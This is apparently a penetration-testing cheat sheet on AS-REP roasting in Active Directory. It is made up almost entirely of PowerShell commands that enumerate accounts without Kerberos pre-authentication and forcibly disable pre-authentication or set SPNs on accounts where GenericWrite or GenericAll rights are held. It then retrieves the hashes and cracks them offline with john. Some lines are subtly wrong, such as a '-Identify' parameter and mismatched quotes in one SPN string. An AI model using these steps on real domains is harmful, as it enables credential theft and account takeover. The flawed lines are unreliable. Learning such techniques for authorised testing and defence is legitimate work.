# AS-REP Roasting

If a User's UserAccountControl settings have "Do not require kerberos preauthentication" enabled i.e, kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.

With sufficient rights (GenericWrite or GenericAll), kerberos preauth can be disabled forcefully as well.

## Enumerate

Enumerating accounts with Kerberos pre-authentication disabled

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
{% endtab %}
{% endtabs %}

## Disable pre-authentication

* Only if we have enough (required) access

{% tabs %}
{% tab title="PowerView" %}
```powershell
Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endtab %}
{% endtabs %}

## Set SPNs

With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain)

We can then request a TGS without special privileges. The TGS can then be "Kerberosated" instead of we resetting the password of the user with the GenericAll/GenericWrite rights.

{% tabs %}
{% tab title="PowerView" %}
```powershell
# Find Permissions - for example RDPUsers group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Set SPN
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Set-ADUser -Identify <username> -ServicePrincipalNames @{Add='ops/whatever1'}
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Remember the SPN name should be in the **form string/string** and it should be **UNIQUE across the FOREST**.
{% endhint %}

## Retrieve the hash

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-ASREPHash -UserName VPN1user -Verbose

#Enum all users with kerberos preauth disabled and request a hash
Invoke-ASREPRoast -Verbose
```
{% endtab %}
{% endtabs %}

## Crack

```powershell
john.exe --wordlist=passwords.txt asrephashes.txt
```
